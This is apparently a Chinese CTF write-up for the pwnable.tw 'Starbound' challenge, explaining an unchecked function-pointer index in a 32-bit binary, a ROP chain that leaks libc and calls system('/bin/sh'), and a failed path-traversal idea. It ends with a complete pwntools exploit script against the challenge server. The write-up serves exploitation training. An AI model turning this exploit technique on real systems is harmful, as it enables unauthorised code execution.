---
layout: post
title: pwnable.tw Starbound
date: 2023-10-13 14:59:14
tags: pwnable.tw
---

本题 neta 了星界边境，实现了一个简单的二维探索游戏。

```sh
[*] '/mnt/c/Projects/ctf_archive/[pwnable.tw]Starbound/pwn'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8047000)
    FORTIFY:  Enabled
```

## 漏洞分析

数组下标未检查导致的任意控制流劫持。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char nptr[256]; // [esp+10h] [ebp-104h] BYREF

  init();
  while ( 1 )
  {
    alarm(0x3Cu);
    menu_func_ptr();
    if ( !readn(nptr, 256u) )
      break;
    v3 = strtol(nptr, 0, 10);
    if ( !v3 )
      break;
    ((void (*)(void))func_ptrs[v3])();          // 数组index溢出！
  }
  do_bye();
  return 0;
}
```

在 main 函数中，有一个对于函数指针数组的调用，index 数据来自于用户输入经 strtol 转化成的数字。我们可以用 `cmd_set_name` 函数修改 data 段的数据，再让程序 call 我们控制的地址，达成 arbitary call。

### 利用

### ROP 方法

有了任意调用，程序又没有开 PIE，接下来就是看看程序本体有哪些东西可以给我们来调用。
我在本体中，并没有找到 win 相关的函数，也没有找到导入的 system 符号，因此似乎没有简单的 ret2text 方法来完成一击必杀。

那就来打个 ROP 吧，我们可以直接用 main 函数 buffer 来存放 ROP 链，只要找一个类似于 `add esp, xxx; ret;` 的 gadget 即可。

使用这种方法，我们可以先用 `puts` 泄露 libc 基址，然后就能 `system("/bin/sh")` 了。具体利用见完整 EXP。
查 libc 版本用的是 [libc-database](https://libc.rip/)，俄罗斯那个（[libc.blukat.me](https://libc.blukat.me/)）查到的结果贼少，不知道为什么。

### 路径穿越方法（存在利用条件限制）

ROP 方法是我不小心从网上看到的，唉我不应该上网查的。
不过我自己也想出了一个非常绝妙的利用，不需要用到 ROP！

我们已有的任意调用，其参数是固定好的，第一个参数是一个我们可控的字符串指针，第二个参数是 0。顺着这个思路，我们可以先看看程序本体中有哪些函数，其第一个参数是 `char*` 类型的。

首先，此类函数肯定是 printf 最常见也最好利用，我们可以用这种方法将任意调用宽展成任意读写，但程序开启了 FORTIFY 保护，里面甚至只有 `_printf_chk` 函数没有 `printf` 函数。两者的区别在于，后者其实是前者的一个 wrapper。
前者的第一个参数是一个安全等级，1 表示开启，0 表示关闭。当开启时，格式化字符串攻击将会被大大削弱，比如不能直接使用 `%n$d` 了，如果要用到这玩意，必须前面要有 `%1$d` `%2$d` ... `%(n-1)$d` 这些。
因此，这条路走不通。

但我们就可以找到另外两个首个参数的—— `mkdir` 和 `open`。既然有 open，就可以想想是不是能 orw 把 flag 读出来。但是，程序的漏洞处，相邻的两次触发之间隔了许多个函数调用，这就不允许我们把 open 返回值暂时放在寄存器中，这里就很难进行下一步操作。

但是，我把整个 binary 都审了一边，发现了一个有趣的机制：

```c
int cmd_multiplayer_enable()
{
  __pid_t v0; // esi
  socklen_t len; // [esp+2Ch] [ebp-80h] BYREF
  struct sockaddr addr; // [esp+32h] [ebp-7Ah] BYREF

  if ( fd != -1 )
    close(fd);
  addr.sa_family = 1;
  fd = socket(1, 2, 0);                         // UDP
  if ( fd >= 0 )
  {
    ...
  }
  puts("[Error] Fail to enable");
  return close(fd);
}
```

在 `cmd_multiplayer_enable` 中，有对于一个全局变量 `fd` 的赋值。而我们知道，进程打开的第一个文件往往是接在 `stderr` 的后面，也就是 fd == 3。
我们可以观察到，程序在使用 close 关闭 fd 之后，并没有清空 fd 的值，也就是这里依然是 3。实际调用这个函数，发现程序肯定可以走到关闭 fd 的代码。

我们查找 fd 的应用，可以找到这里：

```c
int cmd_multiplayer_recvmap()
{
  ...
  
  v5 = getpid();
  puts("Ask your friends to share their coordinates!");
  v0 = 1;
  while ( 1 )
  {
    if ( read(fd, buf, 1u) <= 0 )
      return puts("[Error] Transmission error :(");
    if ( buf[0] == '\n' )
      break;
    buf[0] = rotate_shift_add_decrypt(buf[0], &v5);
    if ( v0 )
    {
      __printf_chk(1, "[Info] Receiving (");
      v0 = 0;
    }
    putchar(buf[0]);
  }
  
  ...
}
```

这里程序将会尝试从 fd 中读取内容，每一个字节都使用 `rotate_shift_add_decrypt` 函数进行加密，然后打印出结果。

于是我们可以想到一条利用链：

1. 调用 `cmd_multiplayer_enable`，让 fd 被置为 3；
2. 调用 `open` 函数打开 flag；
3. 调用 `rotate_shift_add_decrypt`，读取加密后的 flag 并输出；
4. 本地尝试暴力破解！

但我们会遇到一个问题：虽然我们可以控制第一个参数这个字符串，但是其开头被限制了是一个数字，因为我们就是用这个数字当作数组下标来实现任意调用的。
为此，我想到了一种借用 `mkdir` 来加强 `open` 的方法：

1. 调用 `mkdir("-33\0")` 在当前目录创建名为 -33 的文件夹；
2. 调用 `open("-33/../flag\0")` 打开任意目录下的 flag。

在本地，这种方法是可行的。然而，远程环境中执行 binary 的路径是根目录，而进程并没有在根目录创建文件夹的权限，因此这种方法很遗憾地失效了 : (

## 完整EXP

```python
#!/usr/bin/python3
from pwn import *
context.arch = 'i386'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

filename = "./pwn"
io = process([filename])
io = remote("chall.pwnable.tw", 10202)
elf = ELF(filename)

def debug():
    g = gdb.attach(io, """
        b *0x0804A65D
    """)

def pwn():
    # 0x08048e48 : add esp, 0x1c ; ret
    add_esp_1c_ret = 0x08048e48

    payload = flat([
        elf.symbols['puts'], elf.symbols['_start'], elf.got['puts'],
    ])

    io.sendlineafter(b">", b"6")
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"name", pack(add_esp_1c_ret))
    io.sendafter(b">", b"-33\0dead"+payload)

    mes = io.recvuntil(b"\xf7")[-4:]

    libc_base = unpack(mes,32) - 0x5fca0
    log.info("libc_base: " + hex(libc_base))
    system_addr = libc_base + 0x3ada0
    # system_addr = libc_base + 0x49670 # printf

    payload = flat([
        system_addr, elf.symbols['_start'], 0x080580D0+0x4,
    ])

    io.sendlineafter(b">", b"6")
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"name", pack(add_esp_1c_ret)+b"/bin/sh\0")
    io.sendafter(b">", b"-33\0dead"+payload)

    io.interactive()

if __name__ == "__main__":
    pwn()

```

## 反思和总结

**函数数组和数组下标都是非常危险的东西——前者容易被劫持，后者容易超越边界。**
本漏洞修补十分简单，只需要加上一个检查就可以了。

从这道题目的利用中，我们可以发现：**任意调用与 gadget 结合或许可以轻松达成栈迁移，允许我们进行 ROP 攻击。**
